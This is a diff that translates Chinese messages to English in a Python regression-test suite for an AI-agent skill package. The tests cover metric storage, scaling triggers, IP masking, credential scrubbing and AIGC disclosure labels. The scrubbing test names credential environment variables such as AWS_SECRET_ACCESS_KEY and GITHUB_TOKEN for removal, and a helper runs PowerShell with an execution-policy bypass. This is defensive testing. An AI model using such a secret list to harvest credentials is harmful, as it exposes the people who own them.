     def test_no_crlf_and_no_bom_package_wide(self):
-        """★ M-1：全包无 CRLF、无 BOM（按原始字节；通用换行看不见 CRLF）。"""
+        """★ M-1: no CRLF and no BOM package-wide (raw bytes; universal newlines cannot see CRLF)."""
         offenders_crlf, offenders_bom = [], []
         for rel in package_relative_paths():
             raw = (SKILL_DIR / rel).read_bytes()
@@ -1219,12 +1219,12 @@ class InitialReview20261014Tests(unittest.TestCase):
                 offenders_bom.append(rel)
             if b"\r\n" in raw:
                 offenders_crlf.append(rel)
-        self.assertEqual([], offenders_crlf, f"以下文件含 CRLF（须为 LF）：{offenders_crlf}")
-        self.assertEqual([], offenders_bom, f"以下文件以 BOM 开头：{offenders_bom}")
+        self.assertEqual([], offenders_crlf, f"these files contain CRLF (must be LF): {offenders_crlf}")
+        self.assertEqual([], offenders_bom, f"these files start with a BOM: {offenders_bom}")
 
-    # ── M-4：章节引用必须真实存在 ────────────────────────────────────────────
+    # ── M-4: section references must actually exist ──────────────────────────────────────────────
     def test_doc_section_anchors_exist(self):
-        """★ M-4：scaling.md / README-FOR-AI.md 的章节引用目标必须存在。"""
+        """★ M-4: every section reference in scaling.md / README-FOR-AI.md must exist."""
         targets = {
             "scaling.md": markdown_sections("references/scaling.md"),
             "README-FOR-AI.md": markdown_sections("README-FOR-AI.md"),
@@ -1245,29 +1245,29 @@ class InitialReview20261014Tests(unittest.TestCase):
                 doc, section = m.group(1), m.group(2)
                 if section not in targets[doc]:
                     missing.append(f"{rel} -> {doc} §{section}")
-        self.assertEqual([], missing, f"引用了不存在的章节（P8/P19）：{missing}")
+        self.assertEqual([], missing, f"references point at non-existent sections (P8/P19): {missing}")
 
-    # ── H-2a：ValidateSet 的每个取值都必须有 switch 分支 ─────────────────────
+    # ── H-2a: every ValidateSet value must have a switch branch ──────────────────────────────────
     def test_record_metrics_action_implemented(self):
-        """★ H-2a：声明了却无分支的动作不得存在；switch 必须有 default。"""
+        """★ H-2a: an action declared but with no branch must not exist; the switch must have a default."""
         text = (SKILL_DIR / "scripts" / "self-scale.ps1").read_text(encoding="utf-8")
         vs = re.search(r"\[ValidateSet\(([^)]*)\)\]", text)
-        self.assertIsNotNone(vs, "未找到 ValidateSet")
+        self.assertIsNotNone(vs, "no ValidateSet found")
         actions = [a.strip().strip("'\"") for a in vs.group(1).split(",") if a.strip()]
-        self.assertTrue(actions, "ValidateSet 为空")
+        self.assertTrue(actions, "the ValidateSet is empty")
         for action in actions:
             self.assertRegex(
                 text, r"'" + re.escape(action) + r"'\s*\{",
-                f"ValidateSet 声明了 '{action}'，但 switch 无对应分支（H-2 空转）",
+                f"ValidateSet declares '{action}', but the switch has no branch for it (H-2 no-op)",
             )
         self.assertRegex(
             text, r"default\s*\{\s*Stop-WithCode",
-            "switch 缺 default 分支：声明了却未实现的动作会再次静默空转",
+            "the switch is missing a default branch: an action declared but unimplemented would silently no-op again",
         )
 
-    # ── H-2c / H-2d：新鲜宿主指标必须真的参与 T1 ─────────────────────────────
+    # ── H-2c / H-2d: fresh host metrics must really take part in T1 ──────────────────────────────
     def test_host_metric_freshness_uses_config(self):
-        """★ H-2c/H-2d：注入新鲜超阈指标后 T1 必须触发，freshness 不再是空值。"""
+        """★ H-2c/H-2d: after injecting a fresh over-threshold metric, T1 must fire and freshness is no longer empty."""
         workspace = self._temp_workspace()
         self.addCleanup(shutil.rmtree, workspace, ignore_errors=True)
         pkg = self._clean_copy(workspace / "ai-company")
@@ -1276,30 +1276,30 @@ class InitialReview20261014Tests(unittest.TestCase):
             script, "record-metrics", ["-AgentCount", "9", "-Source", "selftest"],
         )
         rec_out = (rec.stdout or "") + (rec.stderr or "")
-        self.assertEqual(0, rec.returncode, f"record-metrics 失败：\n{rec_out[-2000:]}")
+        self.assertEqual(0, rec.returncode, f"record-metrics failed:\n{rec_out[-2000:]}")
         ev = self._run_self_scale(script, "evaluate")
         combined = (ev.stdout or "") + "\n" + (ev.stderr or "")
         self.assertIn(
             "T1 agent capacity: agent_count = 9, threshold > 3", combined,
-            f"新鲜宿主指标未按配置参与 T1：\n{combined[-2500:]}",
+            f"a fresh host metric did not take part in T1 per the config:\n{combined[-2500:]}",
         )
         self.assertIn("TRIGGERED T1", combined,
-                      f"T1 未触发（H-2 复发）：\n{combined[-2500:]}")
+                      f"T1 did not fire (H-2 recurrence):\n{combined[-2500:]}")
         self.assertNotIn(
             "-day freshness limit", combined,
-            "freshness 日志退化为空（Get-CurrentMetrics 未传 -Config）",
+            "the freshness log degraded to empty (Get-CurrentMetrics was not passed -Config)",
         )
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-# ★ 2026-10-14 复审（第二轮）回归防线
+# ★ 2026-10-14 recheck (second round) regression line
 #
-# 初审的 39 条断言全绿，机制仍然坏了三处：宿主指标多写一次即损坏、T3 无视
-# min_routing_samples/freshness、拆分页沿用 legacy 标题与计数。本轮每条断言都
-# 按 CONTRIBUTING.md 的 negative-verify 规则先注回缺陷确认失败，再保留。
+# The initial review's 39 assertions were all green and the mechanism was still broken in three places:
+# a second host-metric write corrupted the store, T3 ignored min_routing_samples/freshness, and the split pages
+# kept the legacy title and count. Every assertion this round was first negative-verified per CONTRIBUTING.md.
 # ═════════════════════════════════════════════════════════════════════════════
 class Recheck20261014Tests(unittest.TestCase):
-    """复审批次（2026-10-14 R2）发现缺陷的机器防线。"""
+    """Machine guard for the defects found in the recheck round (2026-10-14 R2)."""
 
     @classmethod
     def setUpClass(cls):
@@ -1309,13 +1309,13 @@ class Recheck20261014Tests(unittest.TestCase):
 
     def _fn(self, name):
         fn = self.ns.get(name)
-        self.assertTrue(callable(fn), f"模板 {name} 不可调用")
+        self.assertTrue(callable(fn), f"template {name} is not callable")
         return fn
 
     def _run_self_scale(self, script, action, extra=None, timeout=180):
         exe = shutil.which("powershell") or shutil.which("pwsh")
         if exe is None:
-            self.skipTest("未找到 powershell/pwsh；跳过脚本冒烟断言")
+            self.skipTest("no powershell/pwsh found; skipping the script smoke assertion")
         cmd = [exe, "-ExecutionPolicy", "Bypass", "-File", str(script), "-Action", action]
         if extra:
             cmd.extend(extra)
@@ -1347,15 +1347,15 @@ class Recheck20261014Tests(unittest.TestCase):
             shutil.copy2(SKILL_DIR / rel, target)
         return dest
 
-    # ── 复审 B1：宿主指标多写一次不得损坏 host_metrics ────────────────────────
+    # ── Recheck B1: a second host-metric write must not corrupt host_metrics ──────────────────────
     def test_host_metrics_survive_multiple_writes(self):
-        """★ 复审 B1：一次调用写两个宿主指标后，T1 仍必须能读到它们。
+        """★ Recheck B1: after one call writes two host metrics, T1 must still be able to read them.
 
-        此前 Write-HostMetric 用 PSObject.Properties 复制既有的 [ordered]
-        字典，复制到的是 .NET 成员（Count/Keys/Values/...）而不是指标条目，
-        因此同一进程内的第二次写入把 host_metrics 变成垃圾；T1/T3 随即报告
-        "never supplied by any host"，宿主供给的指标静默失效——drop 目录一次
-        投递两个文件（文档推荐的用法）即可触发。
+        Previously Write-HostMetric copied the existing [ordered] dictionary with PSObject.Properties,
+        which copies the .NET members (Count/Keys/Values/...) rather than the metric entries, so the
+        second write in one process turned host_metrics into garbage; T1/T3 then reported
+        "never supplied by any host", silently disabling the host-supplied metrics — a drop directory
+        carrying two files (the documented usage) was enough to trigger it.
         """
         workspace = self._temp_workspace()
         self.addCleanup(shutil.rmtree, workspace, ignore_errors=True)
@@ -1367,31 +1367,31 @@ class Recheck20261014Tests(unittest.TestCase):
         )
         self.assertEqual(
             0, rec.returncode,
-            f"record-metrics 失败：\n{(rec.stdout or '')[-1500:]}",
+            f"record-metrics failed:\n{(rec.stdout or '')[-1500:]}",
         )
         state = json.loads((pkg / ".scaling-state.json").read_text(encoding="utf-8"))
         host = state.get("host_metrics", {})
         self.assertEqual(
             {"agent_count", "routing_accuracy"}, set(host),
-            f"host_metrics 被损坏（多写一次后条目丢失/被 .NET 成员替换）：{host}",
+            f"host_metrics was corrupted (entries lost/replaced by .NET members after a second write): {host}",
         )
-        self.assertEqual(9, host["agent_count"].get("value"), "agent_count 条目被损坏")
+        self.assertEqual(9, host["agent_count"].get("value"), "the agent_count entry was corrupted")
         self.assertEqual(0.5, host["routing_accuracy"].get("value"),
-                         "routing_accuracy 条目被损坏")
+                         "the routing_accuracy entry was corrupted")
         ev = self._run_self_scale(script, "evaluate")
         combined = (ev.stdout or "") + "\n" + (ev.stderr or "")
         self.assertIn("T1 agent capacity: agent_count = 9", combined,
-                      f"宿主指标未被读取：\n{combined[-1500:]}")
+                      f"host metrics were not read:\n{combined[-1500:]}")
         self.assertNotIn("never supplied by any host", combined,
-                         "指标已由宿主写入却被判为从未供给（host_metrics 损坏复发）")
+                         "metrics written by the host were judged never supplied (host_metrics corruption recurrence)")
 
-    # ── 复审 B2：T3 必须遵守 min_routing_samples / freshness ─────────────────
+    # ── Recheck B2: T3 must honour min_routing_samples / freshness ────────────────────────────────
     def test_t3_skips_when_samples_below_minimum(self):
-        """★ 复审 B2：样本数低于 min_routing_samples 时 T3 必须跳过且不计数。
+        """★ Recheck B2: below min_routing_samples, T3 must skip and must not count.
 
-        契约（references/scaling.md §3.1）：样本不足或观测过期时 T3 跳过，
-        never guess。此前该判定只被 T1 消费，T3 直接读回镜像值并累加 miss
-        计数，5 个样本连续三次就能生成升级提案。
+        Contract (references/scaling.md §3.1): with too few samples or a stale observation, T3 skips,
+        never guess. The verdict used to be consumed only by T1, while T3 read the mirrored value and
+        advanced the miss counter, so five samples over three runs could generate an upgrade proposal.
         """
         workspace = self._temp_workspace()
         self.addCleanup(shutil.rmtree, workspace, ignore_errors=True)
@@ -1402,22 +1402,22 @@ class Recheck20261014Tests(unittest.TestCase):
         )
         self.assertEqual(
             0, rec.returncode,
-            f"record-metrics 失败：\n{(rec.stdout or '')[-1500:]}",
+            f"record-metrics failed:\n{(rec.stdout or '')[-1500:]}",
         )
         for _ in range(4):
             ev = self._run_self_scale(script, "evaluate")
             combined = (ev.stdout or "") + "\n" + (ev.stderr or "")
             self.assertNotIn("TRIGGERED T3", combined,
-                             f"低于样本门槛的路由数据触发了升级提案：\n{combined[-1500:]}")
+                             f"routing data below the sample minimum triggered an upgrade proposal:\n{combined[-1500:]}")
             self.assertIn("T3 SKIPPED", combined,
-                          f"T3 未按 min_routing_samples 跳过：\n{combined[-1500:]}")
+                          f"T3 did not skip per min_routing_samples:\n{combined[-1500:]}")
         state = json.loads((pkg / ".scaling-state.json").read_text(encoding="utf-8"))
         self.assertEqual(0, state.get("routing_miss_streak"),
-                         "不可用的路由样本推进了 routing_miss_streak")
+                         "an unusable routing sample advanced routing_miss_streak")
 
-    # ── 复审 B3：version/release/build 不得成为 IPv4 脱敏的豁免 ──────────────
+    # ── Recheck B3: version/release/build must not exempt an IPv4 from masking ───────────────────
     def test_ip_masking_has_no_version_keyword_escape(self):
-        """★ 复审 B3：关键词后的真实 IPv4 必须被脱敏（§9.3 强制）。"""
+        """★ Recheck B3: a real IPv4 after a keyword must still be masked (§9.3 mandatory)."""
         mask = self._fn("mask_sensitive_data")
         cases = {
             "release 192.168.1.100": "release [IP]",
@@ -1428,12 +1428,12 @@ class Recheck20261014Tests(unittest.TestCase):
         for raw, expected in cases.items():
             self.assertEqual(
                 expected, mask(raw),
-                f"{raw!r} 未被脱敏（版本关键词豁免漏洞复发）",
+                f"{raw!r} was not masked (version-keyword exemption recurrence)",
             )
 
-    # ── 复审 B4：凭证擦除必须真的移除变量，且不误删良性变量 ──────────────────
+    # ── Recheck B4: credential scrubbing must really remove variables without wiping benign ones ──
     def test_credential_scrubbing_removes_real_names(self):
-        """★ 复审 B4：_scrubbed_environment 真的移除凭证，PATH/HOME 保留。"""
+        """★ Recheck B4: _scrubbed_environment really removes credentials and keeps PATH/HOME."""
         scrub = self._fn("_scrubbed_environment")
         # _scrubbed_environment() reads os.environ itself (zero-argument contract),
         # so inject the names, call it, and always restore.
@@ -1457,31 +1457,31 @@ class Recheck20261014Tests(unittest.TestCase):
                 else:
                     os.environ[k] = v
         for secret in ("AWS_SECRET_ACCESS_KEY", "GITHUB_TOKEN", "OPENAI_APIKEY"):
-            self.assertNotIn(secret, out, f"凭证变量未从子进程环境移除: {secret}")
+            self.assertNotIn(secret, out, f"credential variable was not removed from the child environment: {secret}")
         for benign in ("PATH", "HOME", "LANG", "TERM"):
-            self.assertIn(benign, out, f"良性变量被误删: {benign}")
+            self.assertIn(benign, out, f"benign variable was wrongly removed: {benign}")
 
-    # ── 复审 B5：AIGC 三层标识（含摘要绑定的内嵌披露） ───────────────────────
+    # ── Recheck B5: the three AIGC labelling layers (including the digest-bound embedded disclosure) ──
     def test_format_output_json_aigc_three_layers(self):
-        """★ 复审 B5：三层标识逐层断言，披露标记必须绑定内容摘要。"""
+        """★ Recheck B5: assert the three layers one by one; the disclosure marker must be bound to the content digest."""
         fmt = self._fn("format_output_json")
         out = fmt("body one", "openai/gpt-4")
         data = json.loads(out)
-        self.assertIs(data.get("ai_generated"), True, "第 2 层缺 ai_generated: true")
-        self.assertIn("generated_at", data, "第 2 层缺 generated_at（此前可被静默删除）")
+        self.assertIs(data.get("ai_generated"), True, "layer 2 is missing ai_generated: true")
+        self.assertIn("generated_at", data, "layer 2 is missing generated_at (it could previously be silently dropped)")
         self.assertRegex(
             data["generated_at"], r"\d{4}-\d{2}-\d{2}T\d{2}:\d{2}",
-            "generated_at 不是 ISO8601",
+            "generated_at is not ISO8601",
         )
         self.assertEqual("openai/gpt-4", data.get("model"),
-                         "model 字段未按 <provider/model> 输出")
+                         "the model field is not emitted as <provider/model>")
         first = re.search(r"\[aigc:[0-9a-f]+\]", data["content"])
-        self.assertIsNotNone(first, "第 3 层缺内容本体内嵌披露标记 [aigc:...]")
+        self.assertIsNotNone(first, "layer 3 is missing the in-body disclosure marker [aigc:...]")
         second = re.search(r"\[aigc:[0-9a-f]+\]",
                            json.loads(fmt("body two", "openai/gpt-4"))["content"])
         self.assertIsNotNone(second)
         self.assertNotEqual(first.group(0), second.group(0),
-                            "披露标记未绑定内容摘要（改正文不失效）")
+                            "the disclosure marker is not bound to the content digest (editing the body does not invalidate it)")
 
 
 # ═════════════════════════════════════════════════════════════════════════════
